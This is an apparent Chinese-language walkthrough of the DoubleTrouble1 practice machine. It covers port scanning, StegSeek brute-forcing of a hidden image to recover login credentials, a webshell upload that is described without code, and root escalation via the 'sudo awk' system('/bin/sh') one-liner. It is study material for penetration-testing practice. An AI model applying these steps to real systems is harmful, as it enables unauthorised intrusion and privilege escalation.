# DoubleTrouble1 靶机实战

## 一、靶机信息

| 项目     | 信息           |
| -------- | -------------- |
| 靶机名称 | DoubleTrouble1 |
| 靶机 IP  | `172.20.10.4`  |
| 开放端口 | 22、80         |
| 操作系统 | Debian         |
| Web 服务 | Apache 2.4.38  |
| SSH 服务 | OpenSSH 7.9p1  |

<img src=".\images\01.png" alt="01" style="zoom:33%;" />

## 二、信息收集

### 1. 端口扫描

使用 Nmap 扫描靶机开放端口及服务信息。

```
nmap -sV 172.20.10.4
```

扫描结果：

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
```

发现两个开放端口：

- 22：SSH 远程登录服务。
- 80：HTTP Web 服务。

<img src=".\images\02.png" alt="01" style="zoom:33%;" />

### 2. Web 信息收集

访问靶机 Web 服务：

```
http://172.20.10.4/
```

发现图片资源：

```
http://172.20.10.4/secret/doubletrouble.jpg
```

<img src=".\images\03.png" alt="01" style="zoom:33%;" />

下载图片 `doubletrouble.jpg`，准备进行隐写分析。

<img src=".\images\04.png" alt="01" style="zoom:33%;" />

## 三、图片隐写分析

### 1. 检查图片隐写

使用图片隐写分析工具 StegSeek 对图片进行分析。

### 2. 爆破图片密码

执行：

```
sudo stegseek doubletrouble.jpg
```

StegSeek 利用密码字典对图片中的隐写数据进行密码爆破。

成功获取图片隐写密码及隐藏内容。

<img src=".\images\05.png" alt="01" style="zoom:33%;" />

### 3. 获取登录凭据

从图片隐写内容中获得：

```
邮箱：otisrush@localhost.com
密码：otis666
```

这组凭据可能用于靶机 Web 登录。



## 四、Web 漏洞利用

### 1. 登录后台

访问：

```
http://172.20.10.4/index.php
```

使用前面获取的账号密码进行登录：

```
Username: otisrush@localhost.com
Password: otis666
```

成功登录后台。

<img src=".\images\07.png" alt="01" style="zoom:33%;" />

### 2. 上传 WebShell

登录成功后，寻找文件上传功能。

利用上传功能上传 WebShell，为后续获取服务器命令执行权限做准备。

### 3. 获取 Shell

通过访问上传的 Shell 文件，成功获得靶机 Shell。

至此，完成从 Web 登录到服务器命令执行的突破。

<img src=".\images\06.png" alt="01" style="zoom:33%;" />

## 五、Linux 本地提权

### 1. 查看当前权限

获取 Shell 后，执行：

```
sudo -l
```

查看当前用户可以使用 sudo 执行的命令。

发现 `awk` 具有 sudo 提权利用条件。



### 2. 利用 AWK 提权

执行：

```
sudo awk 'BEGIN {system("/bin/sh")}'
```

利用 AWK 的 `system()` 函数执行系统命令，启动一个 Shell。

由于 AWK 以 sudo 权限运行，因此新启动的 Shell 继承了对应的高权限。

### 3. 验证提权结果

```
whoami
id
```

成功获得 Root 权限，靶机提权完成。

<img src=".\images\08.png" alt="01" style="zoom:33%;" />

## 六、最终结果

完成 DoubleTrouble1 靶机的完整渗透流程：

1. Nmap 端口扫描，发现 SSH 和 HTTP 服务。

2. 发现 Web 目录中的隐藏图片。

3. 使用 StegSeek 爆破图片隐写密码。

4. 提取图片中的账号密码。

5. 登录 Web 后台。

6. 利用文件上传功能上传 WebShell。

7. 成功获取服务器 Shell。

8. 使用 `sudo -l` 发现 AWK 提权条件。

9. 利用 AWK 执行系统命令，获得 Root 权限。

10. 获得 `doubletrouble2.ova`，进入后续靶机阶段。

    <img src=".\images\09.png" alt="01" style="zoom:33%;" />

## 七、实战总结

本次靶机主要涉及以下知识点：

| 阶段       | 涉及知识点              | 使用工具 |
| ---------- | ----------------------- | -------- |
| 信息收集   | 端口扫描、服务识别      | Nmap     |
| 隐写分析   | 图片隐写、密码爆破      | StegSeek |
| Web 渗透   | 后台登录、文件上传      | 浏览器   |
| 获取权限   | WebShell、命令执行      | Shell    |
| Linux 提权 | Sudo 权限滥用、AWK 提权 | AWK      |

### 关键命令记录

**1. 图片隐写密码爆破**

```
sudo stegseek doubletrouble.jpg
```

**2. 查看 sudo 权限**

```
sudo -l
```

**3. AWK 提权**

```
sudo awk 'BEGIN {system("/bin/sh")}'
```

**4. 验证当前权限**

```
whoami
id
```

### 个人复盘

本次靶机的核心突破点是图片隐写与 Linux sudo 提权。

- 图片隐写：不要只关注 Web 页面本身，图片、附件等资源也可能包含敏感信息。
- StegSeek：掌握使用字典爆破图片隐写密码的方法。
- WebShell：理解文件上传功能与服务器命令执行之间的关系。
- Linux 提权：重点掌握 `sudo -l` 的使用，以及 AWK 等具有命令执行能力的程序如何被滥用。

**本次核心收获：** 将信息收集、隐写分析、Web 渗透、Shell 获取和 Linux 本地提权串联起来，完成一次完整的靶机渗透测试。